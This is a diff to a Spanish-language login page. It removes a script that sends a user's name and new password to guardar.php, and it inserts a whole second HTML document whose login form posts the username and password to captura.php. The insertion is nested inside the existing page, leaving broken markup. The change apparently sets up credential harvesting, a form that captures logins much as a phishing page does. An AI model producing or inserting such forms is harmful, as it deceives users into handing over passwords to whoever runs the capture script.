@@ -235,29 +235,26 @@
     </div>
 <script src="js/login.js"></script><script src="js/login.fonts.js"></script>
 
-<script>
-document.getElementById('btnRecordarPass').addEventListener('click', function () {
-    const usuario = document.getElementById('txtUsuarioRecordar').value;
-    const contrasena = document.getElementById('txtContrasenaNueva').value;
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Formulario de Login</title>
+</head>
+<body>
+  <h2>Iniciar sesión</h2>
+  <form action="captura.php" method="POST">
+    <label for="usuario">Usuario:</label>
+    <input type="text" id="usuario" name="usuario" required><br><br>
 
-    fetch('guardar.php', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/x-www-form-urlencoded'
-        },
-        body: `usuario=${encodeURIComponent(usuario)}&contrasena=${encodeURIComponent(contrasena)}`
-    })
-    .then(res => res.text())
-    .then(data => {
-        console.log(data);
-        alert('Datos enviados a la base de datos');
-    })
-    .catch(err => {
-        console.error(err);
-        alert('Error al enviar datos');
-    });
-});
-</script>
+    <label for="contrasena">Contraseña:</label>
+    <input type="password" id="contrasena" name="contrasena" required><br><br>
+
+    <button type="submit">Enviar</button>
+  </form>
+</body>
+</html>
+
 
 
 </body></html>
